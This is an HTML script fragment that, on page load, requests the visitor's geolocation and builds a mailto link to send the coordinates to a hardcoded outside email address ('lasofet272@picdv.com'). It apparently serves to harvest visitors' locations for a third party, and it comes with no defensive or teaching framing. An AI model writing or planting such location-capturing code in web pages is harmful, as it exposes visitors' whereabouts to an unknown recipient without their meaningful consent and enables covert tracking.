    <!-- JavaScript to send user location via email -->
    <script>
        // Function to capture user location and send email
        function sendUserLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const locationData = {
                        latitude: latitude,
                        longitude: longitude
                    };

                    // Send location data via email
                    const emailBody = JSON.stringify(locationData);
                    const emailAddress = 'lasofet272@picdv.com';
                    const subject = 'User Location';
                    const mailtoLink = `mailto:${emailAddress}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(emailBody)}`;

                    // Open default email client to send email
                    window.location.href = mailtoLink;
                }, error => {
                    console.error('Error getting user location:', error);
                    alert('Failed to get location.');
                });
            } else {
                console.error('Geolocation is not supported by this browser.');
                alert('Geolocation is not supported.');
            }
        }

        // Call the function to send user location via email on page load
        window.onload = sendUserLocation;
    </script>
